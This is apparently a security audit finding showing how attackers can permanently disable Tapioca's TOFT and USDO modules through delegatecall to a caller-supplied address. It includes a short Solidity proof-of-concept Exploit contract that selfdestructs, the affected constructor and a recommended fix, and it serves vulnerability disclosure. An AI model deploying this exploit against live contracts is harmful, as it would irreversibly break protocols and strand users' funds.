---
id: 25668
severity: "Crit/High"
---

# TOFT and USDO Modules Can Be Selfdestructed

## Description



## Proof of Concept

Attacker can deploy the `Exploit` contract below, and then call each of the vulnerable functions with the address of the `Exploit` contract as the `module` parameter. This will cause the module to selfdestruct, rendering it unusable.

```js
pragma solidity ^0.8.18;

contract Exploit {
    address payable constant attacker = payable(address(0xbadbabe));
    fallback() external payable {
        selfdestruct(attacker);
    }
}
```

## Impact

Both BaseTOFT and BaseUSDO initialize the module addresses to state variables in the constructor. Because there are no setter functions to adjust these variables post-deployment, the modules are permanently locked to the addresses specified in the constructor. If those addresses are selfdestructed, the modules are rendered unusable and all calls to these modules will revert. This cannot be repaired.

[BaseUSDO.sol:constructor](<https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/usd0/BaseUSDO.sol#L67-L80>)

```js
    // BaseUSDO.sol:constructor
    constructor(
        address _lzEndpoint,
        IYieldBoxBase _yieldBox,
        address _owner,
        address payable _leverageModule,
        address payable _marketModule,
        address payable _optionsModule
    ) BaseUSDOStorage(_lzEndpoint, _yieldBox) ERC20Permit("USDO") {
        leverageModule = USDOLeverageModule(_leverageModule);
        marketModule = USDOMarketModule(_marketModule);
        optionsModule = USDOOptionsModule(_optionsModule);

        transferOwnership(_owner);
    }
```

## Recommendation

The `module` parameter should be removed from the calldata in each of the vulnerable functions. Since the context of the call into these functions are designed to be delegatecalls and the storage layouts of the modules and the Base contracts are the same, the `module` address can be retreived from storage instead. This will prevent attackers from supplying arbitrary addresses as delegatecall destinations.
